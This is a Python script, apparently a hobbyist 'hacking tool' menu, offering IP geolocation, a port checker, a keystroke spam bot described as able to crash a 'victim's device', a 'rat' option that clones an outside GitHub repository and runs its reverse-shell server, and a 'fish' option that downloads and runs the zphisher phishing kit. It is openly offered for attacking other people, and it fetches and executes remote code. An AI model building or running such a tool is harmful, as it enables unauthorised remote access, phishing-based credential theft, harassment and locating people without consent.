import time
import socket
import pyautogui
import requests
import webbrowser
import colorama
from colorama import Fore, init
import subprocess
import os

init(autoreset=True)


"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ BIG CODE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
def track_ip(ip):
    print(Fore.RED + "GEOLOCATER MADE BY @REDSIMIT")
    url = f"https://ipapi.co/{ip}/json/"
    response = requests.get(url)
    data = response.json()

    network = data.get("network")
    version = data.get("version")
    city = data.get("city")
    country = data.get("country")
    country_name = data.get("country_name")
    country_code = data.get("country_code")
    postal = data.get("postal")
    timezone = data.get("timezone")
    asn = data.get("asn")
    languages = data.get("languages")
    country_capital = data.get("country_capital")
    country_area = data.get("country_area")

    longitude = data.get("longitude")
    latitude = data.get("latitude")

    print(Fore.GREEN + "Network: " + network)
    print(Fore.GREEN + "Version: " + version)
    print(Fore.GREEN + "City: " + city)
    print(Fore.GREEN + "Country: " + country)
    print(Fore.GREEN + "Country_name: " + country_name)
    print(Fore.GREEN + "Country_code: " + country_code)
    print(Fore.GREEN + "Country_capital: " + country_capital)
    print(Fore.GREEN + "Postal Code: " + postal)
    print(Fore.GREEN + "Timezone: " + timezone)
    print(Fore.GREEN + "ASN: " + asn)
    print(Fore.GREEN + "Languages: " + languages)
    print(Fore.GREEN + "Country_area: " + str(country_area))

    print(Fore.GREEN + "Longitude: " + str(longitude))
    print(Fore.GREEN + "Latitude: " + str(latitude))
    print(Fore.GREEN + f"https://www.google.com/maps?q={latitude},{longitude}")
    webbrowser.open(f"https://www.google.com/maps?q={latitude},{longitude}")
"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"


command = ""
while command != "q":
    def redsimit():
        print(Fore.RED + "█████      ████████     ██████      █████   ███    ██         ██    ███    ███████")
        print(Fore.RED + "█    █     ██           █     █    █         █     █ █       █ █     █        █")
        print(Fore.RED + "█    █     ██           █     █    █         █     █  █     █  █     █        █")
        print(Fore.RED + "█████      ████████     █     █      █████   █     █   █   █   █     █        █")
        print(Fore.RED + "█   █      ██           █    █           █   █     █    █ █    █     █        █")
        print(Fore.RED + "█    █     ██           █   █            █   █     █    ███    █     █        █")
        print(Fore.RED + "█     █    ████████     ████         █████  ███    █           █    ███       █")
        print(Fore.RED + "Made by @redsimit ")


    redsimit()

    question = input(Fore.GREEN + """
Avaible commands:
q = quit
geo = opens geolocator
port = opens open port tester
spam = opens a spammbot
rat = opens a remote access trojan (reverse shell) --- linux only :(
fish = opens a phishing website maker --- linux only :(

enter command: """)

    if question == "geo":
        ip = input(Fore.GREEN + "Enter IP Address: ")
        track_ip(ip)

    elif question == "q":
        print(Fore.GREEN + "closing program...")
        time.sleep(1)
        break

    elif question == "port":
        print(Fore.RED + "THIS PORT TESTER WAS MADE BY @REDSIMIT")
        ip = input(Fore.GREEN + "Input the following ip adress: ")
        port = int(input(Fore.GREEN + "Input the following port: "))
        time.sleep(1)
        print(Fore.LIGHTGREEN_EX + "Connecting...")
        time.sleep(2)

        try:
            socket.create_connection((ip, port), timeout=4)
            print(Fore.GREEN + "port is open")
        except socket.error:
            print(Fore.GREEN + "port is closed")

    elif question == "spam":
        print(Fore.GREEN + "BECAREFULL USING THIS BOT IT MIGHT CRASH THE VICTIMS DEVICE!! ")
        limit = input(Fore.RED + "Input the number of messages to send: ")
        speed = input(Fore.RED + "Input the waiting time between messages: ")
        word = input(Fore.RED + "Input your message: ")
        print(Fore.GREEN + "Put your mouse on the place to spamm the messages!")
        time.sleep(3)
        print("SENDING MESSAGES... ")
        a = 1
        while a <= int(limit):
            pyautogui.typewrite(word)
            pyautogui.press("enter")
            a = a + 1
            time.sleep(int(speed))

    elif question == "rat":
        password = input(Fore.RED + "INSTALLING THE TOOL")
        repo = "https://github.com/Simit6155/SchimmelBox-Warriors.git"
        clone_cmd = ["git", "clone", repo]
        subprocess.run(clone_cmd)
        os.chdir("SchimmelBox-Warriors")
        print(Fore.RED + "YOU NEED TO HAVE THE CLIENT.PY RUNNING ON THE SYSTEM U WANNA CONNECT TO !!! ")
        time.sleep(3)
        subprocess.run(["python3", "server.py"])

    elif question == "fish":
        phish_repo = "https://github.com/htr-tech/zphisher.git"
        phish_clone = ["git", "clone", phish_repo]
        subprocess.run(phish_clone)
        os.chdir("zphisher")
        mod_phish = ["chmod" , "+x" , "zphisher.sh"]
        subprocess.run(mod_phish)
        start_phish = ["./zphisher.sh"]
        subprocess.run(start_phish)
